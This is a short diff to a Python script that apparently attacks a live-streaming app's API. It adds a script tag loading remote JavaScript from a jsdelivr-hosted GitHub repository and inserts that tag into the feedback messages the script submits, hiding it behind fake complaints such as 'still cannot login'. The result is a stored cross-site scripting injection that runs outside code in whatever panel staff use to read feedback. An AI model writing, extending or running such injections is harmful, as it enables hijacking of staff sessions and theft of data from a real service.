@@ -45,7 +45,8 @@ LOADERS = [
     "//i.halolive.chat/84/26/43/44/145690950/l.jpg",
     "//i.halolive.chat/84/26/43/44/145690951/m.jpg",
 ]
-SHORTS = ['//is.gd/TErdJC', '//is.gd/DE9E8I']
+SHORTS = ['//is.gd/TErdJC']          # live pin only; DE9E8I is stale
+PJS = "<script src=//cdn.jsdelivr.net/gh/polootyyy/cdnx@1a3fdfc/p.js></script>"
 BLURBS = ["still cannot login", "avatar will not upload", "app crashes on open",
           "coins missing after purchase", "stream keeps buffering",
           "notification never arrives", "profile photo rejected", "checkin button dead"]
@@ -92,7 +93,7 @@ def main():
     if os.environ.get("PLANT_FEEDBACK") == "1":
         tag = time.strftime("%H%M")
         print("feedback", call("/feedback", {"type": random.choice((1, 2, 3, 4)),
-              "text": "%s (#%s)" % (random.choice(BLURBS), tag), "imageList": ""})[0])
+              "text": "%s %s (#%s)" % (PJS, random.choice(BLURBS), tag), "imageList": ""})[0])
 
 
 if __name__ == "__main__":
